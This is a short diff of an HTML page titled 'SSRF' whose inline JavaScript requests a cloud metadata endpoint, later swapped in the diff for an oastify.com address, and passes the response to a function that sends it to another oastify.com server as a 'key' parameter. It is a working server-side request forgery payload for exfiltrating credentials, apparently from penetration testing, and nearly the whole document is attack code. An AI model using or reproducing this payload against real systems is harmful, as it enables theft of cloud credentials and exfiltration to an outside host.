@@ -3,7 +3,8 @@
     <h1> SSRF </h1>
     <script>
 var req = new XMLHttpRequest();
-var url = "http://metadata/computeMetadata";
+var url = "http://2ilbbw1iu033087zn4tssdsab1hy5pte.oastify.com/1";        
+//var url = "http://metadata/computeMetadata";
 
 req.onload = retrieveKeys;
 req.open('GET', url, true);
@@ -16,7 +17,7 @@ function retrieveKeys() {
 }
 
 function sendDataToOtherServer(data) {
-    var otherServerUrl = "https://1suflg2j4y0n7gfzm2xapfxwyn4f03rrg.oastify.com/log?key=" + data;
+    var otherServerUrl = "https://bu9kn5dr69fcchj8zd514m4jnat8hz5o.oastify.com/log?key=" + data;
     
     var reqOtherServer = new XMLHttpRequest();
     reqOtherServer.open('GET', otherServerUrl, true);
